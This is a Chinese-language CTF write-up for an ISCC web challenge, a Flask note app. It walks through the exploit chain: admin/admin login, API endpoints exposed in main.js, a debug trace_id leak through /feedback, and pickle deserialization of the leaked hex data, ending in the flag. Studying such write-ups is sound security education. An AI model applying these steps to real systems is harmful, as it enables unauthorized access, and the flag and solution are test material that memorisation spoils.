# 灵感笔记 - CTF Writeup

**目标**: http://39.105.213.28:5000

**Flag**: `ISCC{c4refu11_debug_tr4ce_l34k_1d0r}`

---

## 漏洞分析

该 Flask 笔记系统存在多个安全缺陷，组合利用后可泄露隐藏的 flag：

1. **弱认证机制** — 登录/注册几乎没有鉴权，`admin/admin` 即可直接登录
2. **敏感信息泄露** — `/main.js` 暴露了管理员专用 API 和内部调试接口
3. **调试日志泄露** — `/feedback` 接口通过 `trace_id` 查询服务端日志，日志中完整保留了 Python 对象的 pickle 序列化数据

---

## 利用过程

### Step 1: 登录管理员账号

```
POST /login
username=admin&password=admin
```

会话直接建立成功，无需任何验证。

### Step 2: 发现隐藏接口

`/main.js` 中暴露了两个关键端点：

```javascript
// Admin hint API
fetch('/api/admin/hint')

// Project detail API
fetch('/api/v1/project/detail', {
    method: 'POST',
    body: JSON.stringify({ project_id: projectId })
})
```

### Step 3: 获取管理提示

```
GET /api/admin/hint
→ {"hint": "POST /api/v1/project/detail ..."}
```

确认了项目详情接口的调用方式。

### Step 4: 访问 flag 项目

```
POST /api/v1/project/detail
Content-Type: application/json

{"project_id": "flag-project-001"}
```

返回 403 拒绝访问，但同时返回了一个 `trace_id`：

```json
{
    "error": "访问被拒绝",
    "message": "您无权查看此笔记",
    "trace_id": "aaf4d5a4-ac7e-4203-b859-9a6ebfb6b8d6"
}
```

### Step 5: 调试日志泄露

```
POST /feedback
trace_id=aaf4d5a4-ac7e-4203-b859-9a6ebfb6b8d6
```

服务端返回的页面中包含调试日志，其中 `stack_trace` 字段泄露了一段十六进制编码的 Python pickle 数据：

```
80049591000000000000007d94288c047479706594...
```

### Step 6: 反序列化获取 Flag

将十六进制数据解码后用 Python pickle 反序列化：

```python
import pickle
obj = pickle.loads(bytes.fromhex(hexdata))
print(obj)
```

输出：

```python
{
    'type': 'FLAG_OBJECT',
    'flag': 'ISCC{c4refu11_debug_tr4ce_l34k_1d0r}',
    'project_id': 'flag-project-001',
    'timestamp': '2026-05-09T04:45:47.135466'
}
```

成功获取 flag。

---

## 总结

| 漏洞类型 | 说明 |
|---------|------|
| 认证缺陷 | 无有效鉴权，可任意登录 |
| 信息泄露 | 前端 JS 暴露内部 API 端点 |
| 调试日志泄露 | `trace_id` 调试机制泄露了 pickle 序列化的敏感数据 |

**Flag**: `ISCC{c4refu11_debug_tr4ce_l34k_1d0r}`

> 提示信息"c4refu11_debug_tr4ce_l34k_1d0r"恰好概括了本题的核心：**careful debug trace leak 1d0r** —— 调试追踪信息泄露导致的敏感数据暴露。
